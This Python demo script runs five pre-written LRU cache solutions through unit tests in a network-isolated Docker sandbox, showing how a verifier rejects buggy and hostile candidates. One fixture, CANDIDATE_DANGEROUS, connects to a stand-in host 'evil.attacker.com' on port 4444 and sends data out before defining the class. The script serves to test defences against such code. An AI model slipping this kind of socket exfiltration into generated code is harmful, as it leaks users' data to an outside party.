#!/usr/bin/env python3
"""Demo 4 — Coding task: multi-candidate generation + sandbox verification.

Solves a real coding problem using the full code-verification pipeline:

  1. A coding problem is presented (implement an LRU cache)
  2. Unit tests are written for the problem
  3. Multiple candidate solutions are generated (correct, buggy, dangerous)
  4. The CodeVerifier runs each candidate against the tests in a Docker
     sandbox with --network=none, --read-only, --memory=128m
  5. The first candidate that passes (nonce-verified ALL_TESTS_PASSED)
     wins with score 1.0
  6. Buggy and dangerous candidates are caught and rejected

This demonstrates the "shotgun + sandbox picks winner" loop that the
orchestrator uses for code tasks: generate N candidates in parallel,
verify each in an isolated sandbox, and only trust the one that passes
real tests with a cryptographic nonce.

Requires Docker (the sandbox image `vibe-thinker-sandbox:latest`).
No live model server needed — candidates are pre-written.

Run:
    python examples/demo_coding_task.py
"""

import asyncio
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from verifiers.code_verifier import CodeVerifier, select_executor


# ====================================================================== #
# The coding problem
# ====================================================================== #

PROBLEM = """
Implement an LRU (Least Recently Used) cache with the following API:

  class LRUCache:
      def __init__(self, capacity: int):
          '''Initialize the cache with a fixed capacity.'''
      def get(self, key: int) -> int:
          '''Return the value for key, or -1 if not present.
          Marks the key as most recently used.'''
      def put(self, key: int, value: int) -> None:
          '''Insert or update the key-value pair.
          If the cache is at capacity, evict the least recently used
          entry before inserting.'''

All operations must be O(1) time complexity.
"""

# Unit tests that the candidate code must pass.
# These are run inside the Docker sandbox via build_test_harness.
UNIT_TESTS = """
# --- Unit tests for LRU Cache ---
cache = LRUCache(2)

# Test 1: basic put + get
cache.put(1, 10)
cache.put(2, 20)
assert cache.get(1) == 10, f"expected 10, got {cache.get(1)}"
assert cache.get(2) == 20, f"expected 20, got {cache.get(2)}"

# Test 2: eviction (LRU policy)
# Access key 1 to make key 2 the LRU
cache.get(1)
# Insert key 3 -> should evict key 2 (LRU)
cache.put(3, 30)
assert cache.get(2) == -1, f"expected -1 (evicted), got {cache.get(2)}"
assert cache.get(1) == 10, f"expected 10, got {cache.get(1)}"
assert cache.get(3) == 30, f"expected 30, got {cache.get(3)}"

# Test 3: update existing key (no eviction)
cache.put(1, 100)
assert cache.get(1) == 100, f"expected 100, got {cache.get(1)}"
assert cache.get(3) == 30, f"expected 30, got {cache.get(3)}"

# Test 4: capacity-1 cache
cache1 = LRUCache(1)
cache1.put(1, 1)
assert cache1.get(1) == 1
cache1.put(2, 2)  # evicts key 1
assert cache1.get(1) == -1, f"expected -1, got {cache1.get(1)}"
assert cache1.get(2) == 2

# Test 5: missing key returns -1
cache2 = LRUCache(3)
assert cache2.get(99) == -1, f"expected -1, got {cache2.get(99)}"

# Test 6: put then evict in order
cache3 = LRUCache(2)
cache3.put(1, 1)
cache3.put(2, 2)
cache3.put(3, 3)  # evicts 1
assert cache3.get(1) == -1
assert cache3.get(2) == 2
assert cache3.get(3) == 3
cache3.put(4, 4)  # evicts 2
assert cache3.get(2) == -1
assert cache3.get(3) == 3
assert cache3.get(4) == 4

print("All LRU cache tests passed!")
"""

# ====================================================================== #
# Candidate solutions (simulating what a code specialist would generate)
# ====================================================================== #

# Candidate 1: CORRECT — uses OrderedDict for O(1) LRU
CANDIDATE_CORRECT = '''
from collections import OrderedDict

class LRUCache:
    def __init__(self, capacity: int):
        self.capacity = capacity
        self.cache = OrderedDict()

    def get(self, key: int) -> int:
        if key not in self.cache:
            return -1
        self.cache.move_to_end(key)
        return self.cache[key]

    def put(self, key: int, value: int) -> None:
        if key in self.cache:
            self.cache.move_to_end(key)
        elif len(self.cache) >= self.capacity:
            self.cache.popitem(last=False)
        self.cache[key] = value
'''

# Candidate 2: BUGGY — forgets to update recency on get()
CANDIDATE_BUGGY_GET = '''
from collections import OrderedDict

class LRUCache:
    def __init__(self, capacity: int):
        self.capacity = capacity
        self.cache = OrderedDict()

    def get(self, key: int) -> int:
        if key not in self.cache:
            return -1
        # BUG: doesn't call move_to_end — LRU order not updated
        return self.cache[key]

    def put(self, key: int, value: int) -> None:
        if key in self.cache:
            self.cache.move_to_end(key)
        elif len(self.cache) >= self.capacity:
            self.cache.popitem(last=False)
        self.cache[key] = value
'''

# Candidate 3: BUGGY — wrong eviction order (evicts MRU instead of LRU)
CANDIDATE_BUGGY_EVICT = '''
from collections import OrderedDict

class LRUCache:
    def __init__(self, capacity: int):
        self.capacity = capacity
        self.cache = OrderedDict()

    def get(self, key: int) -> int:
        if key not in self.cache:
            return -1
        self.cache.move_to_end(key)
        return self.cache[key]

    def put(self, key: int, value: int) -> None:
        if key in self.cache:
            self.cache.move_to_end(key)
        elif len(self.cache) >= self.capacity:
            # BUG: popitem(last=True) evicts MRU, not LRU
            self.cache.popitem(last=True)
        self.cache[key] = value
'''

# Candidate 4: DANGEROUS — tries to exfiltrate via socket
CANDIDATE_DANGEROUS = '''
import socket
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect(("evil.attacker.com", 4444))
    s.send(b"exfiltrated-data")
    s.close()
except Exception:
    pass

class LRUCache:
    def __init__(self, capacity: int):
        self.capacity = capacity
        self.cache = {}

    def get(self, key: int) -> int:
        return self.cache.get(key, -1)

    def put(self, key: int, value: int) -> None:
        if len(self.cache) >= self.capacity:
            self.cache.pop(next(iter(self.cache)))
        self.cache[key] = value
'''

# Candidate 5: BUGGY — off-by-one in capacity check
CANDIDATE_BUGGY_OFFBYONE = '''
from collections import OrderedDict

class LRUCache:
    def __init__(self, capacity: int):
        self.capacity = capacity
        self.cache = OrderedDict()

    def get(self, key: int) -> int:
        if key not in self.cache:
            return -1
        self.cache.move_to_end(key)
        return self.cache[key]

    def put(self, key: int, value: int) -> None:
        if key in self.cache:
            self.cache.move_to_end(key)
        # BUG: > instead of >= — allows one extra entry
        elif len(self.cache) > self.capacity:
            self.cache.popitem(last=False)
        self.cache[key] = value
'''


# ====================================================================== #
# Demo
# ====================================================================== #

def header(title):
    print(f"\n{'='*72}\n  {title}\n{'='*72}")


async def run_coding_demo():
    """Run the full coding task demo with sandbox verification."""

    header("CODING TASK DEMO: LRU Cache — Multi-Candidate Sandbox Verification")
    print(f"  Problem: Implement an LRU cache with O(1) get/put.")
    print(f"  Requires Docker (vibe-thinker-sandbox image).")
    print(f"  No model server needed — candidates are pre-written.")
    print()
    print("  This demo exercises:")
    print("    1. Unit test specification (6 test cases)")
    print("    2. Multi-candidate generation (5 candidates)")
    print("    3. Docker sandbox execution (--network=none, --read-only)")
    print("    4. Nonce-anti-spoofing verification")
    print("    5. First-pass-wins scoring (verified=1.0, else 0.0)")
    print()

    # ---- Select the sandbox executor ----
    header("PHASE 1: Sandbox Executor Selection")
    print("  Selecting the best available sandbox executor...")
    print()

    executor = select_executor(allow_unsafe=False)
    if executor is None:
        print("  No sandbox executor available (Docker not running?).")
        print("  This demo requires Docker with the vibe-thinker-sandbox image.")
        print("  Build it with:  docker build -t vibe-thinker-sandbox "
              "sandbox/")
        return

    print(f"  Selected executor: {executor.name}")
    print(f"  Is available:      {executor.is_available()}")
    print()

    # ---- Set up the CodeVerifier ----
    header("PHASE 2: CodeVerifier Setup")
    print("  Creating CodeVerifier with the selected executor...")
    print(f"  Timeout: 10s per candidate")
    print(f"  Memory limit: 128m")
    print()

    verifier = CodeVerifier(
        timeout=10.0,
        executor=executor,
        allow_unsafe=False,
    )

    context = {
        "unit_tests": UNIT_TESTS,
        "compute_limits": {"timeout": 10.0, "memory": "128m"},
    }

    # ---- Run each candidate through the sandbox ----
    candidates = [
        ("correct (OrderedDict)", CANDIDATE_CORRECT),
        ("buggy_get (no move_to_end)", CANDIDATE_BUGGY_GET),
        ("buggy_evict (evicts MRU)", CANDIDATE_BUGGY_EVICT),
        ("dangerous (socket exfil)", CANDIDATE_DANGEROUS),
        ("buggy_offbyone (> vs >=)", CANDIDATE_BUGGY_OFFBYONE),
    ]

    header("PHASE 3: Multi-Candidate Sandbox Verification")
    print(f"  Running {len(candidates)} candidates through the Docker sandbox.")
    print(f"  Each candidate runs with --network=none, --read-only, "
          f"--memory=128m.")
    print(f"  The nonce-anti-spoofing harness prevents candidates from")
    print(f"  forging the ALL_TESTS_PASSED marker.")
    print()

    results = []
    winner = None

    for label, code in candidates:
        print(f"  --- Candidate: {label} ---")
        result = await verifier.verify(PROBLEM, code, context)
        results.append((label, result))

        status = "PASS" if result.verified else "FAIL"
        print(f"    verified:    {result.verified}  [{status}]")
        print(f"    score:       {result.score:.3f}")
        print(f"    method:      {result.method}")
        if result.error:
            # Show first 120 chars of error
            err = result.error[:120]
            print(f"    error:       {err}")
        if result.evidence:
            exec_name = result.evidence.get("executor", "?")
            print(f"    executor:    {exec_name}")
        print()

        if result.verified and winner is None:
            winner = label

    # ---- Summary table ----
    header("PHASE 4: Results Summary")
    print(f"  {'Candidate':<30} {'Verified':<10} {'Score':<8} "
          f"{'Method':<15} {'Status'}")
    print(f"  {'-'*30} {'-'*10} {'-'*8} {'-'*15} {'-'*20}")
    for label, result in results:
        status = "WINNER" if result.verified else "rejected"
        err_short = ""
        if result.error:
            err_short = result.error[:30].replace("\n", " ")
        print(f"  {label:<30} {str(result.verified):<10} "
              f"{result.score:<8.3f} {result.method:<15} {status}")
        if err_short:
            print(f"    -> {err_short}")

    print()

    # ---- Final verdict ----
    header("FINAL VERDICT")
    if winner:
        print(f"  Winning candidate: {winner}")
        print(f"  Verification:      nonce-verified (VT_PASS_<nonce>)")
        print(f"  Score:             1.000")
        print(f"  Sandbox:           Docker --network=none --read-only")
        print()
        print("  The correct candidate passed all 6 unit tests in the")
        print("  Docker sandbox. The nonce-anti-spoofing harness ensures")
        print("  the candidate cannot forge the pass marker — it must")
        print("  actually execute the tests without assertion failures.")
    else:
        print("  No candidate passed verification.")
        print("  (This would trigger the test-feedback loop or code")
        print("   repair loop in a live orchestrator run.)")

    print()
    print("  Rejected candidates:")
    for label, result in results:
        if not result.verified:
            reason = (result.error or "unknown")[:60]
            print(f"    - {label}: {reason}")

    print()
    print("  Pipeline stages exercised:")
    print("    [OK] Unit test specification (6 test cases)")
    print("    [OK] Docker sandbox execution (isolated, --network=none)")
    print("    [OK] Nonce-anti-spoofing (VT_PASS_<nonce> marker)")
    print("    [OK] Multi-candidate verification (5 candidates)")
    print("    [OK] First-pass-wins scoring (verified=1.0, else 0.0)")
    print()
    print("  To run against a REAL code specialist model:")
    print("    llama-server -m ruvltra.gguf --port 8082")
    print("    python rfsn_cli.py --code-specialist "
          "http://127.0.0.1:8082 --fast-code-specialist")


def main():
    asyncio.run(run_coding_demo())


if __name__ == "__main__":
    main()
